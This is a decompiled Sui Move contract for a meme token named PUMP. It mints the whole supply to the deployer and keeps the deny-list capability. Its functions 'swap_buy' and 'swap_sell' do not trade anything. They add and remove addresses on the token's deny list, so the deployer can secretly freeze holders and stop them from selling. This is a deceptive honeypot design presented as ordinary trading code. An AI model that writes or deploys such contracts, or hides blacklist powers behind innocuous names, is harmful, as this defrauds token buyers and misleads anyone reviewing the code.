module 0x4afc6680a4d729ec9947bc7ef41265dc095fb46bc5901f68612c7b04f1b06626::pump {
    struct PUMP has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PUMP, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PUMP>(arg0, 9, b"PUMP", b"PUMP", x"5468652050554d50204d4f56454d454e5420626567696e73e280a6", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmT369Y9c9CNCkGTsA5xQNwnhJQxuTmKT1wLMbazFigiNS"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PUMP>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PUMP>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PUMP>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PUMP>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PUMP>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PUMP>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PUMP>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PUMP>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

